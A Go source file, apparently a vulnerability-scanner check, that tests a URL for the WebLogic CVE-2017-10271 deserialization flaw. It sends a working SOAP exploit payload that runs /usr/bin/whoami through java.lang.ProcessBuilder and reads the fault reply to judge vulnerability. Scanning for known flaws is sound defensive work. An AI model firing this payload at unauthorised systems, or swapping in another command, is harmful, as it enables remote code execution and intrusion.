package weblogic

import (
    "github.com/yhy0/Jie/pkg/protocols/httpx"
    "github.com/yhy0/logging"
    "strings"
)

func CVE_2017_10271(url string, client *httpx.Client) bool {
    post_str := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="1">
                <void index="0">
                  <string>/usr/bin/whoami</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    `
    header := make(map[string]string, 2)
    header["Content-Type"] = "text/xml;charset=UTF-8"
    header["SOAPAction"] = ""
    if req, err := client.Request(url+"/wls-wsat/CoordinatorPortType", "POST", post_str, header); err == nil {
        if (strings.Contains(req.Body, "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(req.Body, "<faultstring>0")) {
            logging.Logger.Infoln("[Vulnerable] CVE_2017_10271 ", url)
            return true
        }
    }
    logging.Logger.Debugln("[Safety] CVE_2017_10271 ", url)
    return false
}
